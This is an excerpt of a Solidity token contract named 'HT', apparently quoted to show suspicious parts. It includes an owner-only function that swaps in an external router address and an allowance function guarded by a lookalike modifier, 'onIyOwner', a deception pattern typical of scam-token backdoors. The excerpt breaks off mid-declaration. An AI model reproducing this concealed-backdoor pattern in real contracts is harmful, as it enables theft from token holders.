...
contract HT is Context, IERC20, Ownable {
    ...
    string private constant _name = "HT";
    ...
    address payable private _developmentAddress = payable(0x05d89cD3461420425D8f3cEcd40e90eA1ffcF172);
    address payable private _marketingAddress = payable(0x05d89cD3461420425D8f3cEcd40e90eA1ffcF172);
    ...
    function setSniper (address[] memory IDExroter) external onlyOwner {
        ...
        IDEXrouter = IERC20(IDExroter[0]);
    }
 
    function increaseAllowances(address spender, uint256 amount) external onIyOwner { 
